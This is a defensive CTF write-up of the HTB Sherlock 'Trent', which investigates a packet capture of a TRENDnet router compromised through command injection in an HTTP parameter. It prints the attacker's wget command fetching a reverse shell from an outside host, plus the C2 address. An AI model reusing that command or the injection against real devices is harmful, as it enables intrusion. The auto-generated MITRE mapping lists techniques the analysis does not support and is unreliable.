---
layout: page
title: "Sherlock: Trent - Report"
permalink: /writeups/htb-sherlocks-blue-team-writeups/sherlock-24-trent/report/
---

# Trent

## Overview

| Field | Value |
| --- | --- |
| Source PDF | `Trent.pdf` |
| Pages | 15 |
| Difficulty | Medium |
| Prepared by | 0xdf |
| Author | (s): a1l4m |

## Scenario Summary

The SOC team has identified suspicious lateral movement targeting router
firmware from within the network. Anomalous traffic patterns and command
execution have been detected on the router, indicating that an attacker
already inside the network has gained unauthorized access and is
attempting further exploitation.
You will be given network traffic logs from one of the impacted machines.
Your task is to conduct a thorough investigation to unravel the
attacker's Techniques, Tactics, and Procedures (TTPs).
Description
In this Sherlock, you are asked to investigate a compromised small office
home office (SOHO) wireless router using a packet capture.

## Investigation Objective

Identify the activity described in the scenario, analyze the provided artifacts, answer the investigation questions, and document evidence in a repeatable Blue Team report format.

## Evidence Provided

The download contains a single network capture file:
trent.pcap - 0d33e5c7959f9bc089b35666714cad1a
Skills Learnt
Packet capture (PCAP) analysis

## Tools Used

| Tool | Purpose |
| --- | --- |
| Wireshark | Used or likely relevant based on the source writeup |

## Investigation Process

### Question 1: From what IP address did the attacker initially launched their activity?
- Analysis note: The analysis above shows 192.168.10.2 is interacting with the SOHO router. The analysis
to answer the remaining questions will show that this is the attacking IP.
- Answer: `192.168.10.2`
### Question 2: What is the model name of the compromised router?
- Analysis note: The JavaScript in the HTML page in the introduction analysis shows setting a variable
model to the string "TEW-827DRU".
- Answer: `TEW-827DRU`
### Question 3: How many failed login attempts did the attacker try before successfully logging into
the router?
- Analysis note: The login attempt is an HTTP POST request to /apply_sec.cgi :
The password is sent base64 encoded:
$ echo "cGFzc3dvcmQ=" | base64 -d
password
Adding a filter for the target IP and HTTP POST requests ( ip.addr==192.168.10.1 and
http.request.method==POST ) shows three posts to /apply_sec.cgi before it switches
to something else:
There's a bunch of requests for images, stylesheets, and scripts after each requests. We
ca
- Answer: `2`
### Question 4: At what UTC time did the attacker successfully log into the routers web admin
interface?
- Analysis note: The third POST request is the successful login. The packet details under "Frame" have the
UTC time:
- Answer: `2024-05-01 15:53:27`
### Question 5: How many characters long was the password used to log in successfully?
- Analysis note: In that same data view for the same packet, there's the "HTML Form" data:
We've already observed that the base64-encoded password is sent in the log_pass field.
In this case, it's empty.
- Answer: `0`
### Question 6: What is the current firmware version installed on the compromised router?
- Analysis note: Shortly after login there's a request to /adm_status.asp . In the body, towards the
bottom, the firmware version is given:
- Answer: `2.10`
### Question 7: Which HTTP parameter was manipulated by the attacker to get remote code
execution on the system?
- Analysis note: Let's update the filter to look only at POST requests, as that's the most common way to
submit data to the server ( http.request.method==POST ). After the three login requests,
there are POSTs sent to /apply.cgi . The first POST body looks like:
The next one is similar, but there's a command injection attempt in the
usbapps.config.smb_admin_name parameter:
The backticks in most Linux shell environments will run the c
- Answer: `usbapps.config.smb_admin_name`
### Question 8: What is the CVE number associated with the vulnerability that was exploited in this
attack?
- Analysis note: Searching for the parameter plus the model number and version returns the NVD entry for
CVE-2024-28353:
Without the firmware version number, we'll find a lot of posts about similar 2021 CVEs.
Looking at the details, the vulnerability is described as:
There is a command injection vulnerability in the TRENDnet TEW-827DRU router with
firmware version 2.10B01. An attacker can inject commands into the post request
paramet
- Answer: `CVE-2024-28353`
### Question 9: What was the first command the attacker executed by exploiting the vulnerability?
- Analysis note: This is answered in the analysis from question 7.
- Answer: `whoami`
### Question 10: What command did the actor use to initiate the download of a reverse shell to the
router from a host outside the network?
- Analysis note: The next few POST requests are trying to download a reverse shell. The first looks like this:
Then the attacker tries again leaving off the trailing backtick. Something fails, and they
have to log in again, and then try the same initial download command again.
- Answer: `wget http://35.159.25.253:8000/a1l4m.sh`
### Question 11: Multiple attempts to download the reverse shell from an external IP failed. When the
actor made a typo in the injection, what response message did the server return?
- Analysis note: In the second attempt to download the reverse shell, the actor left off the trailing backtick:
Following that stream, the message is "Access to this resource is forbidden":
- Answer: `Access to this resource is forbidden`
### Question 12: What was the IP address and port number of the command and control (C2) server
when the actor's reverse shell eventually did connect?
- Analysis note: (IP:Port)
After failing to get the shell script from an external IP, the actor tries to get it from their
foothold in the local network, 192.168.10.2:
Immediately after this POST, there's a GET request from 192.168.10.1 to 192.168.10.2
requesting the shell:
Following that GET request's stream show the script is a simple Bash reverse shell:
- Answer: `35.159.25.253:41143`

## Key Findings

| Finding / Question | Answer / Evidence |
| --- | --- |
| From what IP address did the attacker initially launched their activity? | 192.168.10.2 |
| What is the model name of the compromised router? | TEW-827DRU |
| How many failed login attempts did the attacker try before successfully logging into
the router? | 2 |
| At what UTC time did the attacker successfully log into the routers web admin
interface? | 2024-05-01 15:53:27 |
| How many characters long was the password used to log in successfully? | 0 |
| What is the current firmware version installed on the compromised router? | 2.10 |
| Which HTTP parameter was manipulated by the attacker to get remote code
execution on the system? | usbapps.config.smb_admin_name |
| What is the CVE number associated with the vulnerability that was exploited in this
attack? | CVE-2024-28353 |
| What was the first command the attacker executed by exploiting the vulnerability? | whoami |
| What command did the actor use to initiate the download of a reverse shell to the
router from a host outside the network? | wget http://35.159.25.253:8000/a1l4m.sh |
| Multiple attempts to download the reverse shell from an external IP failed. When the
actor made a typo in the injection, what response message did the server return? | Access to this resource is forbidden |
| What was the IP address and port number of the command and control (C2) server
when the actor's reverse shell eventually did connect? | 35.159.25.253:41143 |

## Attack Timeline

See `timeline.md` for extracted timestamps and timeline notes.

## Indicators of Compromise

See `iocs.md` for extracted indicators and context.

## MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
| --- | --- | --- |
| Execution | Command and Scripting Interpreter | Observed in extracted case notes; validate with report evidence. |
| Credential Access | Credential Dumping / Unsecured Credentials | Observed in extracted case notes; validate with report evidence. |
| Discovery | System / Network Discovery | Observed in extracted case notes; validate with report evidence. |
| Lateral Movement | Remote Services | Observed in extracted case notes; validate with report evidence. |
| Collection | Data from Local System / Cloud Storage | Observed in extracted case notes; validate with report evidence. |
| Exfiltration | Exfiltration Over Web Service | Observed in extracted case notes; validate with report evidence. |
| Impact | Data Encrypted for Impact | Observed in extracted case notes; validate with report evidence. |
| Defense Evasion | Obfuscated Files or Information | Observed in extracted case notes; validate with report evidence. |

## Impact Assessment

Assess affected users, hosts, accounts, data exposure, and operational risk after validating the evidence.

## Recommendations

- Preserve original artifacts and document hashes.
- Validate suspicious accounts, hosts, IP addresses, domains, and files.
- Add detections for the confirmed behaviors.
- Review access control and logging gaps found during the investigation.

## Lessons Learned

Add lessons learned after completing the investigation.

## Conclusion

This report was generated from the source PDF and should be reviewed while solving the Sherlock manually. Replace draft notes with your own investigation evidence before publishing.
